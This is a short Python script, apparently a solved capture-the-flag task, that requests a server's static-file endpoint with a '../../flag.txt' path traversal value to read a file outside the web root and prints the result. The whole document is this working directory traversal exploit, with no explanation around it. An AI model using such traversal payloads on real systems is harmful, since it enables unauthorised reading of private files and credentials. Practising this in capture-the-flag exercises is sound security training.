# resolved
# coding=utf8
import requests

url = 'http://62.173.140.174:16012/static?file=../../flag.txt'
site_pars = requests.session()
html = site_pars.get(url).content
print(html)